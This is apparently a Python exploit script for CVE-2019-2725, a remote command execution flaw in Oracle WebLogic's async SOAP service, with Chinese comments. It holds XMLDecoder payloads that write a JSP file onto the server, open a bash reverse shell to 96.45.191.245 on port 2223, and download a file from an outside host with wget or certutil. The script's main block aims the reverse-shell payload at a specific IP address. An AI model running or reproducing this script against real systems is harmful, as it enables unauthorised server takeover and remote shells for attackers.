"""
影响产品：
    Oracle WebLogic Server10.3.6.0.0
    Oracle WebLogic Server12.1.3.0.0
    Oracle WebLogic Server12.2.1.1.0
    Oracle WebLogic Server12.2.1.2.0
影响组件：
    bea_wls9_async_response.war
    wsat.war
上传shell的路径的默认的，如果目标服务器修改过，可以先反弹shell之后查看路径
CVE-2019-2725
"""
import requests
import time

poc_all = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.8.0_131" class="java.beans.xmlDecoder"><object class="java.io.PrintWriter"><string>servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/goop.jsp</string><void method="println"><string><![CDATA[
<%out.println("Check_Vuln_Weblogic"); %>]]>
</string></void><void method="close"/></object></java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>'''
linux_nc = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
<soapenv:Header> 
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i &gt;&amp; /dev/tcp/96.45.191.245/2223 0&gt;&amp;1</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>'''

lin_poc = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
<soapenv:Header> 
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>wget http://www.gooip.club/goop.txt -O servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/goop.txt</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>'''

win_poc = '''<soapenv:Header> 
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>cmd</string>
</void>
<void index="1">
<string>/c</string>
</void>
<void index="2">
<string>certutil -urlcache -split -f http://www.gooip.club/goop.txt servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/goop.txt</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>'''

timeout = 5


def url_check(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
    }
    url = url + '/_async/AsyncResponseService'
    try:
        req = requests.get(url, headers=headers, timeout=timeout)
        if 'AsyncResponseService home page' in req.text:
            result = "目标可能存在WebLogic wls9-async远程命令执行漏洞（CNVD-C-2019-48814）, check url: %s" % url
            return result
    except:
        pass


def txt_check_all(url):
    headers = {
        'User-Agent': 'Mozilla/5.0(WindowsNT10.0;Win64;x64;rv: 52.0) Gecko/20100101',
        'content-type': 'text/xml'
    }
    try:
        req2 = requests.post(url + '/_async/AsyncResponseService', headers=headers, timeout=timeout, data=poc_all, )
        time.sleep(1.5)
        req_txt = requests.get(url + '/_async/goop.jsp', timeout=timeout)
        if 'Check_Vuln_Weblogic' in req_txt.text:
            result = "目标存在WebLogic wls9-async远程命令执行漏洞（CNVD-C-2019-48814）, check url: %s" % (
                    url + '/_async/goop.jsp')
            return result
    except:
        pass


def txt_check_lin(url):
    proxies = {'http': '127.0.0.1:9999'}
    headers = {
        'User-Agent': 'Mozilla/5.0(WindowsNT10.0;Win64;x64;rv: 52.0) Gecko/20100101',
        'content-type': 'text/xml'
    }
    try:
        req2 = requests.post(url + '/_async/AsyncResponseService', headers=headers, timeout=timeout, data=lin_poc, )
        time.sleep(1.5)
        req_txt = requests.get(url + '/_async/goop.txt', timeout=timeout)
        if 'Vuln_GOOP' in req_txt.text:
            result = "目标存在WebLogic wls9-async远程命令执行漏洞（CNVD-C-2019-48814）, OS : linux check url: %s" % (
                    url + '/_async/goop.txt')
            return result
    except:
        pass


def txt_check_win(url):
    proxies = {'http': '127.0.0.1:9999'}
    headers = {
        'User-Agent': 'Mozilla/5.0(WindowsNT10.0;Win64;x64;rv: 52.0) Gecko/20100101',
        'content-type': 'text/xml'
    }
    try:
        req2 = requests.post(url + '/_async/AsyncResponseService', headers=headers, timeout=timeout, data=win_poc, )
        time.sleep(1.5)
        req_txt = requests.get(url + '/_async/goop.txt', timeout=timeout)
        # print(req_txt.text)
        if 'Vuln_GOOP' in req_txt.text:
            result = "目标存在WebLogic wls9-async远程命令执行漏洞（CNVD-C-2019-48814）, OS : win check url: %s" % (
                    url + '/_async/goop.txt')
            return result
    except:
        pass


def nc_shell(url):
    proxies = {'http': '127.0.0.1:9999'}
    headers = {
        'User-Agent': 'Mozilla/5.0(WindowsNT10.0;Win64;x64;rv: 52.0) Gecko/20100101',
        'content-type': 'text/xml'
    }
    try:
        req2 = requests.post(url + '/_async/AsyncResponseService', headers=headers, timeout=timeout, data=linux_nc,
                             proxies=proxies)
        time.sleep(1.5)
    except:
        pass


def poc(url):
    # result = txt_check_all(url)
    # if result:
    #     return result
    # result1 = txt_check_lin(url)
    # if result1:
    #     return result1
    # result2 = txt_check_win(url)
    # if result2:
    #     return result2
    res = nc_shell(url)

    result3 = url_check(url)
    if result3:
        return result3


if __name__ == "__main__":
    a = poc('http://58.40.21.161')
    print(a)
